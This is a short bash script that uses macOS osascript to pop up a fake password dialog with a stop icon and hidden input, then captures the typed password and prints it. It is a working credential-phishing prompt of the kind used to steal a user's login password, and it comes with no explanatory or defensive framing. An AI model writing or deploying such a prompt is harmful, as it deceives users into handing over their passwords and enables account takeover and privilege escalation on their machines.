#!/bin/bash
osascript -e 'display dialog "Please enter your user password" default answer "" with icon stop buttons {"Continue"} default button "Continue" with hidden answer
set w to text returned of the result
do shell script "echo " & quoted form of w'
